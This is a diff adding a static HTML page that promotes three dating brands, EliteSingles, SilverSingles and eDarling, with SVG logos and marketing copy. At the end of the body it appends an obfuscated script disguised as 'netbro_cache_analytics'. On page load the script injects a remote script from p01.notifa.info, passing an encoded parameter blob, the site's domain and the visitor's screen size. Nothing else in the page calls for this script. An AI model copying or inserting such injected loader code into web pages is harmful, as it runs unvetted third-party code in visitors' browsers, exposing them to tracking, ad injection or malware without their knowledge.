@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Our brands</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css">
+    <style>
+      .image svg
+      {
+        display: block;
+        height: auto;
+        width: 100%;
+      }
+      .brand-elite
+      {
+        background-color: #31a45c;
+        border-radius: 10px;
+      }
+      .brand-silver
+      {
+        background-color: #e03351;
+        border-radius: 10px;
+      }
+      .brand-ed
+      {
+        background-color: #145d7f;
+        border-radius: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="container">
+        <div class="navbar-menu">
+          <div class="navbar-start">
+            <a class="navbar-item is-active" href="./index.html">
+              Our brands
+            </a>
+            <a class="navbar-item" href="./professional-dating.html">
+              Professional dating
+            </a>
+            <a class="navbar-item" href="./christian-dating.html">
+              Christian dating
+            </a>
+            <a class="navbar-item" href="./dating-over-60.html">
+              Dating over 60
+            </a>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <section class="hero is-light">
+      <div class="hero-body">
+        <div class="container">
+          <article class="media">
+            <figure class="media-left">
+                <p class="image is-64x64 brand-elite">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 37 37" width="128" height="128">
+                    <path fill="#fff" d="M20.91,6.19c0,.51-.28.75.35.92.24.07.46.1.68.15h-.09c-3.92.56-7.61,4-9,7.32a10.39,10.39,0,0,0-.67,5.15c-.61.25-1.23.51-1.89.8a14.81,14.81,0,0,0-4.49-1.18c-.21.77-.7,1.12.41,1.41.72.19,1.37.23,2,.46l.29.11c-1.27.6-1.82,1-1,2.05l1.55-.76L9,23c-.21.68-.56,1.24-.84,1.92-.43,1.07.15.88.89,1.16a15.28,15.28,0,0,0,1.7-4.21c.58-.26,1.14-.49,1.7-.72a9.45,9.45,0,0,0,2.43,4.4,12.56,12.56,0,0,0,6.75,3.13,28,28,0,0,0,3.66.25l0,0a8,8,0,0,0,2.35-.23c-.27.28-.65.62-.9.85-.47.44.15.84.44,1.27a5.09,5.09,0,0,0,2.27-2.63,1.94,1.94,0,0,0-.5-1.47c-.73-.4-1.74.13-2.59.52h0a5.08,5.08,0,0,1-3.25.45C20,27.35,17.44,26,16,23.27a9.12,9.12,0,0,1-1-3A45.5,45.5,0,0,1,23,18.42a1.29,1.29,0,0,0-.62.89,1.08,1.08,0,0,0,.46.9,1.59,1.59,0,0,0,1.57.15,4.16,4.16,0,0,0,1-.71,5.44,5.44,0,0,0,.38-.46c.12-.16.22-.31.33-.45s.23-.27.35-.4l.38-.39c.26-.26.53-.52.8-.77a.38.38,0,0,0,.09-.12.37.37,0,0,0-.19-.5h0c-.45-.2-.91-.39-1.35-.61l-.65-.32-.31-.18-.35-.19a3,3,0,0,0-1.56-.36,1.88,1.88,0,0,0-.76.24,1.43,1.43,0,0,0-.55.55.86.86,0,0,0-.13.74A1.13,1.13,0,0,0,23,17c-.85.12-1.85.3-3.08.52a39.74,39.74,0,0,0-5,1.29A10.57,10.57,0,0,1,15,17.25,10.69,10.69,0,0,1,23.93,8.7h0c.59-.13.76-.33.7-.58C24.18,7,22.26,6.63,20.91,6.19Z"/>
+                  </svg>
+                </p>
+            </figure>
+            <div class="media-content" style="align-self: center">
+              <h1 class="title">EliteSingles</h1>
+              <h2 class="subtitle">EliteDating, EliteRencontre, ElitSinglar, Elittárs, EliittiKumppani, Partner na úrovni, PartnerMedNiveau</h2>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+        <div class="columns is-multiline">
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Online Dating with EliteSingles</h4>
+            <div class="content">
+              <p>EliteSingles caters only to those looking for a serious relationship. Over 85% of members are 30+ and more than 85% have a university degree.</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">High Success Rate</h4>
+            <div class="content">
+              <p>Thousands of singles find love through our services each month. Register today and find someone you truly suit on EliteSingles.</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Serious Online Dating</h4>
+            <div class="content">
+              <p>If you are serious about dating, EliteSingles is the right dating site for you. We believe that finding a compatible partner – who genuinely suits your lifestyle and dating preferences – is crucial for your lasting happiness.</p>
+<p>EliteSingles is one of the leading global dating sites, creating on average 2000 new couples each month in more than 20 countries worldwide, earning the trust of over 13 million singles.</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Intelligent Matchmaking</h4>
+            <div class="content">
+              <p>We constantly fine-tune our matchmaking algorithm to deliver only the most relevant and active singles in line with your preferences.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="hero is-light">
+      <div class="hero-body">
+        <div class="container">
+          <article class="media">
+            <figure class="media-left">
+                <p class="image is-64x64 brand-silver">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="35.3mm" height="35.3mm" viewBox="0 0 100 100">
+                    <polygon points="0 100 100 100 100 0 0 0 0 100" fill="none"/>
+                    <path d="M77.8,48.2a7.9,7.9,0,0,1,5.6,1.1,7.5,7.5,0,0,1,2.2,10.6C81.1,66.9,69,66.8,65,66.6A79.3,79.3,0,0,1,50,76.7l-.7.3-.7-.3C47.4,76.1,20,62.3,20,42.8a16.2,16.2,0,0,1,29.3-9.2,16.2,16.2,0,0,1,29.3,9.2A21.6,21.6,0,0,1,77.8,48.2Zm-2.7-1.6a18.3,18.3,0,0,0,.4-3.8,13.2,13.2,0,0,0-24.9-5.6l-1.4,2.7-1.4-2.7A13.2,13.2,0,0,0,23,42.8c0,16.1,22,28.6,26.2,30.8a80,80,0,0,0,13.4-9.1c-2-4.1-6-14-1.7-20.5a7.9,7.9,0,0,1,10.8-2.2A7.6,7.6,0,0,1,75.1,46.6Z" fill="#fff"/>
+                  </svg>
+                </p>
+            </figure>
+            <div class="media-content" style="align-self: center">
+              <h1 class="title">SilverSingles</h1>
+              <h2 class="subtitle">SilberSingles, Nos Belles Années</h2>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+        <div class="columns is-multiline">
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Serious 50+ Dating</h4>
+            <div class="content">
+              <p>SilverSingles offers serious 50+ dating. This means that if you're one of the millions of singles over 50 out there, and you're looking for love and companionship, our dating site is the one for you! Other dating sites are bigger and flashier, but you're best served by a dating site that suits your needs. If you want a serious relationship for your golden years, don't waste your time - sign up for SilverSingles today!</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">How Our Matchmaking Works</h4>
+            <div class="content">
+              <p>Most other over 50 dating sites will only show you profiles of people who live close by. SilverSingles does more. All of our members take a personality test so that we can get to know them better - this helps us pair people up based on their compatibilty. Location is important of course, but knowing you're a good fit with your matches makes finding 'the one' much, much easier.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="hero is-light">
+      <div class="hero-body">
+        <div class="container">
+          <article class="media">
+            <figure class="media-left">
+                <p class="image is-64x64 brand-ed">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 37 37" width="128" height="128">
+                    <path fill="#fff" d="M19.73,8H12.91v5.27a5.93,5.93,0,0,1,1.39-.17,5.38,5.38,0,0,1,1.48.21V10.66h3.77c5.14,0,8.08,2.83,8.08,7.76s-2.93,7.73-8.05,7.73H17.76a10.67,10.67,0,0,1-2.23,2.7h4.23c6.53,0,10.75-4.09,10.75-10.43S26.28,8,19.73,8Z"/>
+                    <path fill="#fdc64a" d="M8.91,23.79A5.81,5.81,0,0,0,9.26,26a2.08,2.08,0,0,0,2.52,1.26,4.73,4.73,0,0,0,2.69-1.73,15,15,0,0,0,1.06-1.4.54.54,0,0,1,.84,0c.06.08,0,.15,0,.23a8.86,8.86,0,0,1-4,4.29,3.8,3.8,0,0,1-1.79.46,3.89,3.89,0,0,1-3.88-3.11,9.55,9.55,0,0,1,1.66-7.51,8.56,8.56,0,0,1,3.38-3.14,4.25,4.25,0,0,1,3.74-.13A2.57,2.57,0,0,1,16.83,18c-.25,1.58-1.84,2.78-2.69,3.29a11.13,11.13,0,0,1-5,1.39C9,22.67,8.93,23.32,8.91,23.79Zm.38-2.21a0,0,0,0,0,0,0,7.92,7.92,0,0,0,2.24-.44,4.72,4.72,0,0,0,3.17-3.69,1.33,1.33,0,0,0-.39-1.36,1.26,1.26,0,0,0-1.45,0,6.76,6.76,0,0,0-2,1.8A10.45,10.45,0,0,0,9.28,21.57Z"/>
+                  </svg>
+                </p>
+            </figure>
+            <div class="media-content" style="align-self: center">
+              <h1 class="title">eDarling</h1>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+        <div class="columns is-multiline">
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Who uses eDarling?</h4>
+            <div class="content">
+              <p>eDarling is a dating site used by a wide variety of single men and single women. There are some commonalities that bring our members together: for instance, the majority of our members are educated, relatively affluent, and between the ages of 30 and 55. That said, singles of all ages can (and do!) find love on our site as, above anything, we are designed for singles seeking lasting commitment. This focus on finding lasting, joyful love is the major hope that unites all of our members, no matter what their background.</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Intelligent, Thoughtful Matchmaking</h4>
+            <div class="content">
+              <p>Our technology provides a smooth browsing experience so you meet your match easily. We deliver 3-7 compatible introductions a day according to your personal preferences and we automatically filter out inactive users so you don't waste time looking at unsuitable profiles. We unite like-minded singles & cater for all races, religions and ages. So whether you’re looking for senior dating, Muslim dating, Christian dating, gay dating – or simply long-lasting love – eDarling is the dating site for you.</p>
+            </div>
+          </div>
+          <div class="column is-half-tablet is-half-desktop">
+            <h4 class="title is-4">Genuine, Professional Members</h4>
+            <div class="content">
+              <p>eDarling is curated to ensure we introduce you to interesting, like-minded single men and single women looking for a long-term commitment. Our members are mostly educated singles aged 30-55, so you can easily meet someone like-minded, whether you're a younger professional or an older dater getting into online dating for the first time. There's no need to feel nervous about internet dating – unlike many dating sites, we verify each new member to make sure that everyone is genuine, so all you need to worry about is finding a compatible match.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2wofOZa4QFYcfGg8qi6zOaMaPouyrZnWiAAHudOLx4OaQOgOt4WUWrVvqJ1HRCYj4yqStbwQPA7QkybJLsl5R0XP8FJii0CqOWrcmMLVQwqeYM0JGL6Q0haqQxZ414G0bKbhhb8U0YAGyMH2a7RTPpjeZXTsTuFLAKb%2fMymwS2T%2b8UEYY4diSmnfftNfXR2BRNmiTbvdmBeYyVstr8qMO6yUX6J4UazWz2lrxyfNjW%2fdcXIYoenF19P9mxmp%2bFyNI3i7poxXg8jm14fRvV0ltmcZ2JC3A79TMda%2fNuVBQmklj6TmbHWBCrg166Z%2bGPrX%2b%2fUsi90aNujyl01zxWFZgxQbkZtFBu8GlvPJxgXjq879be8WDiYtvz6K8RWExQcFFmwC7qsTi5CYUzzMMrK09FHjqCN%2bRasTZgvsxL0GtqEDiHv5781%2bBZyUyVJWaovTjX1irn%2fLyvfrAKr4TeeAFZWfepRZD%2fh2SygC0m6%2ffdnhgHpLhT%2bGsjw25I254gRkKT5q40mbTgqIcv18BQih9hlq%2fqqwQh%2fOZE9rJ38kdlbGzCTP%2f9wjJgw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
